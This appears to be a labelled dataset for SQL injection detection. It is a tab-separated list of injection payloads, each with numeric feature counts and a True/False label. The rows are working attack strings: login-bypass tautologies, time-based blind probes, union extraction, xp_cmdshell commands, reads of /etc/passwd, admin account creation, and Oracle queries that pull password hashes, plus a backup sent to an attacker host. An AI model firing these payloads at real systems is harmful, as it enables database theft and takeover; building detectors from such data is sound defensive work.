0x770061006900740066006f0072002000640065006c00 ...	0	0	3	0	1	50	False
%20'sleep%2050'	2	1	2	0	0	15	False
as	0	0	0	1	0	2	False
1)) or pg_sleep(__time__)--	1	3	4	0	2	27	False
/**/or/**/1/**/=/**/1	9	1	0	0	0	21	True
 union all select @@version--	1	2	2	2	4	29	False
,@variable	0	1	2	0	0	10	False
(sqlattempt2)	0	0	2	0	0	13	False
 or (exists)	0	1	2	0	2	12	False
t'exec master..xp_cmdshell 'nslookup www.googl ...	2	1	7	0	4	50	False
%20$(sleep%2050)	0	1	4	0	0	16	False
1 or benchmark(10000000,md5(1))#	1	2	5	1	2	32	False
%20or%20''='	4	1	2	0	0	12	True
||utl_http.request	0	0	1	0	0	18	False
 or pg_sleep(__time__)--	1	3	2	0	2	24	False
hi' or 'x'='x';	6	1	2	0	2	15	True
") or sleep(__time__)="	2	3	3	0	2	23	False
 or 'whatever' in ('whatever')	4	1	4	1	4	30	False
; begin declare @var varchar(8000) set @var=' ...	2	4	8	2	7	49	False
 union select 1,load_file('/etc/passwd'),1,1,1;	2	4	5	0	3	47	False
0x77616974666f722064656c61792027303a303a313027 ...	0	0	3	0	1	50	False
exec(@s)	0	1	3	0	0	8	False
) or pg_sleep(__time__)--	1	3	3	0	2	25	False
 union select	0	2	0	0	2	13	False
 or sleep(__time__)#	1	3	2	0	2	20	False
 select * from information_schema.tables--	1	2	2	1	4	42	False
a' or 1=1--	3	1	0	0	2	11	True
a' or 'a' = 'a	5	1	2	0	4	14	True
declare @s varchar(22) select @s =	1	2	4	1	5	34	False
 or 2 between 1 and 3	0	2	0	1	6	21	False
 or a=a--	2	1	0	0	2	9	True
 or '1'='1	4	1	1	0	2	10	True
|	0	0	0	0	0	1	False
 or sleep(__time__)='	2	3	2	0	2	21	False
 or 1 --'	2	1	0	0	3	9	False
or 0=0 #"	3	1	0	0	2	9	True
having	0	0	0	0	0	6	False
a'	1	0	0	0	0	2	False
" or isnull(1/0) /*	1	2	2	0	3	19	False
declare @s varchar (8000) select @s = 0x73656c ...	1	2	7	1	8	50	True
 or 1=1 --	2	1	0	0	3	10	True
char%4039%41%2b%40select	0	1	4	0	0	24	False
order by	0	1	0	1	1	8	False
bfilename	0	0	0	0	0	9	False
 having 1=1--	2	0	0	0	2	13	True
) or benchmark(10000000,md5(1))#	1	2	6	1	2	32	False
 or username like char(37);	0	2	3	1	4	27	False
;waitfor delay '0:0:__time__'--	3	3	3	0	2	31	False
" or 1=1--	2	1	0	0	2	10	True
x' and userid is null; --	2	2	1	1	5	25	False
*/*	1	0	1	0	0	3	False
 or 'text' > 't'	4	1	3	0	4	16	False
 (select top 1	0	1	1	1	3	14	False
 or benchmark(10000000,md5(1))#	1	2	5	1	2	31	False
");waitfor delay '0:0:__time__'--	3	3	4	0	2	33	False
a' or 3=3--	3	1	0	0	2	11	True
 -- &password=	2	0	1	0	2	14	False
 group by userid having 1=1--	2	0	0	1	5	29	True
 or ''='	4	1	1	0	2	8	True
; exec master..xp_cmdshell	0	1	3	0	2	26	False
%20or%20x=x	1	1	2	0	0	11	True
select	0	1	0	0	0	6	False
")) or sleep(__time__)="	2	3	4	0	2	24	False
0x730065006c0065006300740020004000400076006500 ...	0	0	3	0	1	50	False
hi' or 1=1 --	3	1	0	0	3	13	True
") or pg_sleep(__time__)--	1	3	3	0	2	26	False
%20or%20'x'='x	4	1	2	0	0	14	True
 or 'something' = 'some'+'thing'	7	1	3	0	4	32	True
exec sp	0	1	0	0	1	7	False
29 %	0	0	1	0	1	4	False
(	0	0	1	0	0	1	False
1 or pg_sleep(__time__)--	1	3	2	0	2	25	False
0 or 1=1	1	1	0	0	2	8	True
) or (a=a	1	1	2	0	2	9	True
uni/**/on sel/**/ect	4	0	0	0	1	20	False
replace	0	0	0	0	0	7	False
%27%20or%201=1	1	1	3	0	0	14	True
)) or pg_sleep(__time__)--	1	3	4	0	2	26	False
%7c	0	0	1	0	0	3	False
x' and 1=(select count(*) from tabname); --	3	2	6	2	6	43	False
&apos;%20or	0	1	3	0	0	11	False
; or '1'='1'	5	1	2	0	2	12	True
declare @q nvarchar (200) select @q = 0x770061 ...	1	2	7	1	8	50	True
1 or 1=1	1	1	0	0	2	8	True
; exec ('sel' + 'ect us' + 'er')	6	1	8	0	7	32	False
23 or 1=1	1	1	0	0	2	9	True
/	0	0	1	0	0	1	False
anything' or 'x'='x	5	1	1	0	2	19	True
declare @q nvarchar (4000) select @q =	1	2	4	1	6	38	False
or 0=0 --	2	1	0	0	2	9	True
desc	0	0	0	0	0	4	False
||'6	2	0	0	0	0	4	False
)	0	0	1	0	0	1	False
1)) or sleep(__time__)#	1	3	4	0	2	23	False
or 0=0 #	2	1	0	0	2	8	True
 select name from syscolumns where id = (sele ...	1	1	4	2	9	49	True
hi or a=a	1	1	0	0	2	9	True
*(|(mail=*))	1	0	6	0	0	12	False
password:*/=1--	3	0	1	0	0	15	False
distinct	0	0	0	1	0	8	False
);waitfor delay '0:0:__time__'--	3	3	4	0	2	32	False
to_timestamp_tz	0	0	0	0	0	15	False
") or benchmark(10000000,md5(1))#	1	2	6	1	2	33	False
 union select	0	2	0	0	2	13	False
%2a%28%7c%28mail%3d%2a%29%29	0	0	8	0	0	28	False
+sqlvuln	0	0	1	0	0	8	False
 or 1=1 /*	2	1	0	0	3	10	True
)) or sleep(__time__)='	2	3	4	0	2	23	False
or 1=1 or ""=	4	2	0	0	3	13	True
 or 1 in (select @@version)--	1	2	4	2	5	29	False
sqlvuln;	0	0	1	0	0	8	False
 union select * from users where login = char ...	1	3	4	3	10	49	True
x' or 1=1 or 'x'='y	6	2	1	0	4	19	True
28 %	0	0	1	0	1	4	False
 or 3=3 --	2	1	0	0	3	10	True
@variable	0	1	1	0	0	9	False
 or '1'='1'--	6	1	1	0	2	13	True
"a"" or 1=1--"	5	1	0	0	2	14	True
//*	1	0	1	0	0	3	False
%2a%7c	0	0	2	0	0	6	False
" or 0=0 --	2	1	0	0	3	11	True
")) or pg_sleep(__time__)--	1	3	4	0	2	27	False
?	0	0	1	0	0	1	False
 or 1/*	1	1	0	0	2	7	False
!	0	0	1	0	0	1	False
'	1	0	0	0	0	1	False
 or a = a	1	1	0	0	4	9	True
declare @q nvarchar (200) select @q = 0x770061006900740066006f0072002000640065006c00610079002000270030003a0030003a0031003000270000 exec(@q)	1	3	7	1	8	139	True
declare @s varchar(200) select @s = 0x77616974666f722064656c61792027303a303a31302700 exec(@s) 	1	3	7	1	8	94	True
declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)	0	2	6	1	5	101	False
declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)	1	3	7	1	8	80	True
' or 1=1	2	1	0	0	2	8	True
 or 1=1 --	2	1	0	0	3	10	True
x' or full_name like '%bob%	2	1	3	1	4	27	False
'; exec master..xp_cmdshell 'ping 172.10.1.255'--	4	2	7	0	4	49	False
'%20or%20''='	5	1	2	0	0	13	True
'%20or%20'x'='x	5	1	2	0	0	15	True
')%20or%20('x'='x	5	1	5	0	0	17	True
' or 0=0 --	3	1	0	0	3	11	True
' or 0=0 #	3	1	0	0	3	10	True
 or 0=0 #"	3	1	0	0	3	10	True
' or 1=1--	3	1	0	0	2	10	True
' or '1'='1'--	7	1	1	0	2	14	True
' or 1 --'	3	1	0	0	3	10	False
or 1=1--	2	1	0	0	1	8	True
' or 1=1 or ''='	6	2	1	0	4	16	True
 or 1=1 or ""=	4	2	0	0	4	14	True
' or a=a--	3	1	0	0	2	10	True
 or a=a	1	1	0	0	2	7	True
') or ('a'='a	5	1	3	0	2	13	True
'hi' or 'x'='x';	7	1	2	0	2	16	True
or	0	1	0	0	0	2	False
procedure	0	1	0	0	0	9	False
handler	0	0	0	0	0	7	False
' or username like '%	2	1	2	1	4	21	False
' or uname like '%	2	1	2	1	4	18	False
' or userid like '%	2	1	2	1	4	19	False
' or uid like '%	2	1	2	1	4	16	False
' or user like '%	2	1	2	1	4	17	False
'; exec master..xp_cmdshell	1	1	3	0	2	27	False
'; exec xp_regread	1	2	1	0	2	18	False
t'exec master..xp_cmdshell 'nslookup www.google.com'--	4	1	5	0	3	54	False
--sp_password	1	0	0	0	0	13	False
' union select	1	2	0	0	2	14	False
' union all select	1	2	0	1	3	18	False
' or (exists)	1	1	2	0	2	13	False
' (select top 1	1	1	1	1	3	15	False
'||utl_http.request	1	0	1	0	0	19	False
1;select%20*	0	1	3	0	0	12	False
<>"'%;)(&+	2	0	8	0	0	10	False
'%20or%201=1	2	1	2	0	0	12	True
'sqlattempt1	1	0	0	0	0	12	False
%28	0	0	1	0	0	3	False
%29	0	0	1	0	0	3	False
%26	0	0	1	0	0	3	False
%21	0	0	1	0	0	3	False
' or ''='	5	1	1	0	2	9	True
' or 3=3	2	1	0	0	2	8	True
 or 3=3 --	2	1	0	0	3	10	True
'; exec master..xp_cmdshell 'ping 10.10.1.2'--	4	2	7	0	4	46	False
'create user name identified by 'pass123' --	4	1	1	2	6	44	False
'create user name identified by pass123 temporary tablespace temp default tablespace users; 	1	1	1	3	12	92	False
' ; drop table temp --	2	1	1	1	5	22	False
'exec sp_addlogin 'name' , 'password' --	6	1	3	0	5	40	False
' exec sp_addsrvrolemember 'name' , 'sysadmin' --	6	1	3	0	6	49	False
' insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')) --	8	2	14	2	11	100	False
' grant connect to name; grant resource to name; --	2	0	2	0	9	51	False
' insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)	1	12	37	3	25	190	False
' or 1=1 --	3	1	0	0	3	11	True
' union (select @@version) --	2	2	4	1	4	29	False
' union (select null, (select @@version)) --	2	4	7	1	6	44	False
' union (select null, null, (select @@version)) --	2	5	8	1	7	50	False
' union (select null, null, null,  (select @@version)) --	2	6	9	1	9	57	False
' union (select null, null, null, null,  (select @@version)) --	2	7	10	1	10	63	False
' union (select null, null, null, null,  null, (select @@version)) --	2	8	11	1	11	69	False
select @@version	0	1	2	1	1	16	False
select @@servernamee	0	1	2	0	1	20	False
select @@microsoftversione	0	2	2	0	1	26	False
select * from master..sysserverse	0	1	3	1	3	33	False
select * from sysusers	0	1	1	1	3	22	False
exec master..xp_cmdshell 'ipconfig+/all'	2	2	4	0	2	41	False
exec master..xp_cmdshell 'net+view'	2	1	4	0	2	35	False
exec master..xp_cmdshell 'net+users'	2	1	4	1	2	36	False
exec master..xp_cmdshell 'ping+<attackerip>'	2	2	6	0	2	44	False
backup database master to disks='\\<attackerip>\<attackerip>\backupdb.dat'	4	1	6	0	4	74	False
create table myfile (line varchar(8000))" bulk insert foo from 'c:\inetpub\wwwroot\auth.aspâ'" select * from myfile"--	6	4	8	3	13	118	False
1'1	1	0	0	0	0	3	False
1 exec sp_ (or exec xp_)	0	3	2	0	5	24	False
1 and 1=1	1	1	0	0	2	9	True
1' and 1=(select count(*) from tablenames); --	3	2	6	2	6	46	False
1 or 1=1	1	1	0	0	2	8	True
1' or '1'='1	5	1	1	0	2	12	True
create table myfile (input text); load data infile '<filepath>' into table myfile; select * from myfile;	2	2	9	5	15	104	False
or 1=1--	2	1	0	0	1	8	True
'or '' = '	5	1	2	0	3	10	True
'--	2	0	0	0	0	3	False
' union select 1, '<user-fieldname>', '<pass-fieldname>' 1--	6	2	8	0	6	60	False
'or 1=1--	3	1	0	0	1	9	True
’ or ‘1’=’1	1	1	0	0	2	11	True
' or '1'='1	5	1	1	0	2	11	True
'||utl_http.request('http://192.168.1.1/')||'	5	0	8	0	0	45	False
' || myappadmin.adduser('admin', 'newpass') || '	8	0	7	0	5	48	False
' and 1=utl_inaddr.get_host_address((select banner from v$version where rownum=1)) and 'i'='i	7	3	6	3	9	93	True
' and 1=utl_inaddr.get_host_address((select sys.login_user from dual)) and 'i'='i	6	4	7	1	7	81	True
' and 1=utl_inaddr.get_host_address((select sys.database_name from dual)) and 'i'='i	6	4	7	1	7	84	True
' and 1=utl_inaddr.get_host_address((select host_name from v$instance)) and 'i'='i	6	3	6	1	7	82	True
' and 1=utl_inaddr.get_host_address((select global_name from global_name)) and 'i'='i	6	3	6	1	7	85	True
' and 1=utl_inaddr.get_host_address((select count(distinct(username)) from sys.all_users)) and 'i'='i	6	4	11	3	7	101	True
' and 1=utl_inaddr.get_host_address((select count(distinct(password)) from sys.user$)) and 'i'='i	6	4	11	3	7	97	True
' and 1=utl_inaddr.get_host_address((select count(distinct(table_name)) from sys.all_tables)) and 'i'='i	6	4	11	3	7	104	True
' and 1=utl_inaddr.get_host_address((select count(distinct(column_name)) from sys.all_tab_columns)) and 'i'='i	6	4	11	3	7	110	True
' and 1=utl_inaddr.get_host_address((select count(distinct(granted_role)) from dba_role_privs where grantee=sys.login_user)) and 'i'='i	7	4	11	4	9	135	True
' and 1=utl_inaddr.get_host_address((select distinct(username) from (select distinct(username), rownum as limit from sys.all_users) where limit=1)) and 'i'='i	7	7	14	6	15	158	True
' and 1=utl_inaddr.get_host_address((select distinct(password) from (select distinct(password), rownum as limit from sys.user$) where limit=1)) and 'i'='i	7	7	14	6	15	154	True
' and 1=utl_inaddr.get_host_address((select distinct(table_name) from (select distinct(table_name), rownum as limit from sys.all_tables) where limit=1)) and 'i'='i	7	7	14	6	15	163	True
' and 1=utl_inaddr.get_host_address((select distinct(column_name) from (select distinct(column_name), rownum as limit from all_tab_columns) where limit=1)) and 'i'='i	7	6	13	6	15	166	True
' and 1=utl_inaddr.get_host_address((select distinct(granted_role) from (select distinct(granted_role), rownum as limit from dba_role_privs where grantee=sys.loginuser) where limit=1)) and 'i'='i	8	7	14	7	17	195	True
' and 1=utl_inaddr.get_host_address((select distinct(username) from (select distinct(username), rownum as limit from sys.all_users) where limit=2)) and 'i'='i	7	7	14	6	15	158	True
' and 1=utl_inaddr.get_host_address((select distinct(password) from (select distinct(password), rownum as limit from sys.user$) where limit=2)) and 'i'='i	7	7	14	6	15	154	True
' and 1=utl_inaddr.get_host_address((select distinct(table_name) from (select distinct(table_name), rownum as limit from sys.all_tables) where limit=2)) and 'i'='i	7	7	14	6	15	163	True
' and 1=utl_inaddr.get_host_address((select distinct(column_name) from (select distinct(column_name), rownum as limit from all_tab_columns) where limit=2)) and 'i'='i	7	6	13	6	15	166	True
' and 1=utl_inaddr.get_host_address((select distinct(granted_role) from (select distinct(granted_role), rownum as limit from dba_role_privs where grantee=sys.loginuser) where limit=2)) and 'i'='i	8	7	14	7	17	195	True
' and 1=utl_inaddr.get_host_address((select distinct(username) from (select distinct(username), rownum as limit from sys.all_users) where limit=3)) and 'i'='i	7	7	14	6	15	158	True
' and 1=utl_inaddr.get_host_address((select distinct(password) from (select distinct(password), rownum as limit from sys.user$) where limit=3)) and 'i'='i	7	7	14	6	15	154	True
' and 1=utl_inaddr.get_host_address((select distinct(table_name) from (select distinct(table_name), rownum as limit from sys.all_tables) where limit=3)) and 'i'='i	7	7	14	6	15	163	True
' and 1=utl_inaddr.get_host_address((select distinct(column_name) from (select distinct(column_name), rownum as limit from all_tab_columns) where limit=3)) and 'i'='i	7	6	13	6	15	166	True
' and 1=utl_inaddr.get_host_address((select distinct(granted_role) from (select distinct(granted_role), rownum as limit from dba_role_privs where grantee=sys.loginuser) where limit=3)) and 'i'='i	8	7	14	7	17	195	True
' and 1=utl_inaddr.get_host_address((select distinct(username) from (select distinct(username), rownum as limit from sys.all_users) where limit=4)) and 'i'='i	7	7	14	6	15	158	True
' and 1=utl_inaddr.get_host_address((select distinct(password) from (select distinct(password), rownum as limit from sys.user$) where limit=4)) and 'i'='i	7	7	14	6	15	154	True
' and 1=utl_inaddr.get_host_address((select distinct(table_name) from (select distinct(table_name), rownum as limit from sys.all_tables) where limit=4)) and 'i'='i	7	7	14	6	15	163	True
' and 1=utl_inaddr.get_host_address((select distinct(column_name) from (select distinct(column_name), rownum as limit from all_tab_columns) where limit=4)) and 'i'='i	7	6	13	6	15	166	True
' and 1=utl_inaddr.get_host_address((select distinct(granted_role) from (select distinct(granted_role), rownum as limit from dba_role_privs where grantee=sys.loginuser) where limit=4)) and 'i'='i	8	7	14	7	17	195	True
' and 1=utl_inaddr.get_host_address((select distinct(username) from (select distinct(username), rownum as limit from sys.all_users) where limit=5)) and 'i'='i	7	7	14	6	15	158	True
' and 1=utl_inaddr.get_host_address((select distinct(password) from (select distinct(password), rownum as limit from sys.user$) where limit=5)) and 'i'='i	7	7	14	6	15	154	True
' and 1=utl_inaddr.get_host_address((select distinct(table_name) from (select distinct(table_name), rownum as limit from sys.all_tables) where limit=5)) and 'i'='i	7	7	14	6	15	163	True
' and 1=utl_inaddr.get_host_address((select distinct(column_name) from (select distinct(column_name), rownum as limit from all_tab_columns) where limit=5)) and 'i'='i	7	6	13	6	15	166	True
' and 1=utl_inaddr.get_host_address((select distinct(granted_role) from (select distinct(granted_role), rownum as limit from dba_role_privs where grantee=sys.loginuser) where limit=5)) and 'i'='i	8	7	14	7	17	195	True
' and 1=utl_inaddr.get_host_address((select distinct(username) from (select distinct(username), rownum as limit from sys.all_users) where limit=6)) and 'i'='i	7	7	14	6	15	158	True
' and 1=utl_inaddr.get_host_address((select distinct(password) from (select distinct(password), rownum as limit from sys.user$) where limit=6)) and 'i'='i	7	7	14	6	15	154	True
' and 1=utl_inaddr.get_host_address((select distinct(table_name) from (select distinct(table_name), rownum as limit from sys.all_tables) where limit=6)) and 'i'='i	7	7	14	6	15	163	True
' and 1=utl_inaddr.get_host_address((select distinct(column_name) from (select distinct(column_name), rownum as limit from all_tab_columns) where limit=6)) and 'i'='i	7	6	13	6	15	166	True
' and 1=utl_inaddr.get_host_address((select distinct(granted_role) from (select distinct(granted_role), rownum as limit from dba_role_privs where grantee=sys.loginuser) where limit=6)) and 'i'='i	8	7	14	7	17	195	True
' and 1=utl_inaddr.get_host_address((select distinct(username) from (select distinct(username), rownum as limit from sys.all_users) where limit=7)) and 'i'='i	7	7	14	6	15	158	True
' and 1=utl_inaddr.get_host_address((select distinct(password) from (select distinct(password), rownum as limit from sys.user$) where limit=7)) and 'i'='i	7	7	14	6	15	154	True
' and 1=utl_inaddr.get_host_address((select distinct(table_name) from (select distinct(table_name), rownum as limit from sys.all_tables) where limit=7)) and 'i'='i	7	7	14	6	15	163	True
' and 1=utl_inaddr.get_host_address((select distinct(column_name) from (select distinct(column_name), rownum as limit from all_tab_columns) where limit=7)) and 'i'='i	7	6	13	6	15	166	True
' and 1=utl_inaddr.get_host_address((select distinct(granted_role) from (select distinct(granted_role), rownum as limit from dba_role_privs where grantee=sys.loginuser) where limit=7)) and 'i'='i	8	7	14	7	17	195	True
' and 1=utl_inaddr.get_host_address((select distinct(username) from (select distinct(username), rownum as limit from sys.all_users) where limit=8)) and 'i'='i	7	7	14	6	15	158	True
' and 1=utl_inaddr.get_host_address((select distinct(password) from (select distinct(password), rownum as limit from sys.user$) where limit=8)) and 'i'='i	7	7	14	6	15	154	True
' and 1=utl_inaddr.get_host_address((select distinct(table_name) from (select distinct(table_name), rownum as limit from sys.all_tables) where limit=8)) and 'i'='i	7	7	14	6	15	163	True
' and 1=utl_inaddr.get_host_address((select distinct(column_name) from (select distinct(column_name), rownum as limit from all_tab_columns) where limit=8)) and 'i'='i	7	6	13	6	15	166	True
' and 1=utl_inaddr.get_host_address((select distinct(granted_role) from (select distinct(granted_role), rownum as limit from dba_role_privs where grantee=sys.loginuser) where limit=8)) and 'i'='i	8	7	14	7	17	195	True
select version();	0	1	3	1	1	18	False
select current_database();	0	1	3	0	1	26	False
select current_user;	0	1	1	0	1	20	False
select session_user;	0	1	1	0	1	20	False
select current_setting('log_connections');	2	1	4	0	1	42	False
select current_setting('log_statement');	2	1	4	0	1	40	False
select current_setting('port');	2	1	4	0	1	31	False
select current_setting('password_encryption');	2	1	4	0	1	46	False
select current_setting('krb_server_keyfile');	2	1	4	0	1	45	False
select current_setting('virtual_host');	2	1	4	0	1	39	False
select current_setting('port');	2	1	4	0	1	31	False
select current_setting('config_file');	2	1	4	0	1	38	False
select current_setting('hba_file');	2	1	4	0	1	35	False
select current_setting('data_directory');	2	1	4	0	1	41	False
select * from pg_shadow;	0	1	2	1	3	24	False
select * from pg_group;	0	1	2	1	3	23	False
create table myfile (input text);	0	1	3	1	4	33	False
copy myfile from '/etc/passwd'; 	2	1	2	2	4	32	False
select * from myfile;copy myfile to /tmp/test;	0	1	3	2	6	46	False
sleep(1) /*‘ or sleep(1) or ‘“ or sleep(1) or “*/	2	7	6	0	9	49	False
sleep(1) /*' or sleep(1) or '" or sleep(1) or "*/	6	7	7	0	9	49	False
